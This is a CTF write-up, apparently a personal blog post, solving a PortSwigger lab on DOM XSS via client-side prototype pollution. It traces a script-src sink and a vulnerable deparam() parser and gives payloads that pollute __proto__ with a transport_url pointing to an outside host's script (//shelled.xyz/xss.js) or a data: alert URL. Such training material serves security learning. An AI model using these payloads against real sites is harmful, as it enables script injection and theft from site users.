---
title: PortSwigger - DOM XSS via client-side prototype pollution
date: 2025-04-12 18:48:00 -5000
categories: [CTF]
tags: [ctf, web, prototype pollution]     # TAG names should always be lowercase
---

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/0.png)
*Website Landing Page*

<br/>

When looking for Prototype pollution, we need find some logic that that:

1. Parses user supplied JSON
2. Constructs a JavaScript object in a way that prototype pollution can be introduced. This is usually through a merge function like so:

```jsx
for(var attr in source) {
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
```

3. The user controlled object needs to end up in an XSS sink.

<br/>

# Finding the Sink
I prefer to search for the sinks in the application and then work my way backwards to see if that source is controllable. When searching through the JavaScript code, the following code block stood out in the `searchLogger.js` file.

```jsx
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

From the code above, it is clear that if we can control the value of `config.transport_url` then we will be able to get XSS.

<br/>

# Finding the Source
Now that we have the sink, lets work our way backwards to find where the `config.transport_url` is coming from. The `config` value is being set just above with the following code:

```jsx
let config = {params: deparam(new URL(location).searchParams.toString())};
```

<br/>

The `config` object appears to have a key of `params` which has a value from the result of the `deparam()` function which takes the `URLSearchParams` as a parameter. 

<br/>

```jsx
location.href = "https://example.com/page?name=Josh&age=30"

new URL(location).searchParams.toString()
// returns: "name=Josh&age=30"
```
*This is how the `searchParams` function operates*

<br/>

The `config` only has a `params` key, and we need a `transport_url` key in order to trigger the XSS. 

<br/>

# Debugging

If the `deparam()` function performs some merging operation then we may be able to pollute the `config` object to have the following:

```jsx
config = {
	params: {
		__proto__: {
			transport_url: //shelled.xyz/xss.js
		}
	}
}
```

<br/>

The `deparam()` function is quite complex, but in summary it is:

1. Taking the URL parameters (ex. `name=Josh&age=30`)
2. Replacing all `+` characters with a space.
3. Splitting on the `&` character (ex. `[name=Josh, age=30]`)
4. Iterating over each element in (`[name=Josh, age=30]`)
5. Splitting at the `=` sign. `[name, Josh]`
6. Has some checks for nested parameters
7. I give up… 

```jsx
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};

```
*`deparam.js` file with the `deparam` function*

<br/>

Following logic flows like this can be quite complex. This one is do able, but when hunting on a bug bounty target the code will most likely be a lot longer, minimized and potentially obfuscated. 

With a general idea of what is happening, I’m going to use the chrome debugger to infer the rest. To do this I’m going to set a breakpoint on the source that we control.

![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/1.png)

<br/>

Sending a request:
```jsx
https://web-security-academy.net/?name=josh&age=30
```

Result - As you can see, the `deparam()` function appears to be taking the URL search parameters and constructing a JSON object out of it.
![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/2.png)

<br/>

# Prototype Pollution
With no real idea if the `deparam()` function will be vulnerable to Prototype Pollution or not, I’ll give it a shot, after all, requests are free.

We want the following structure:

```jsx
config = {
	params: {
		__proto__: {
			transport_url: //shelled.xyz/xss.js
		}
	}
}
```

![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/3.png)

![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/4.png)

<br/>

The lab however will not make external requests to my sever, so the other solution is to either use Burp Collaborator if you have Burp Pro or you can use the payload `data:text/javascript,alert(1)`.

![](/assets/portswigger/dom-xss-via-client-side-prototype-pollution/5.png)
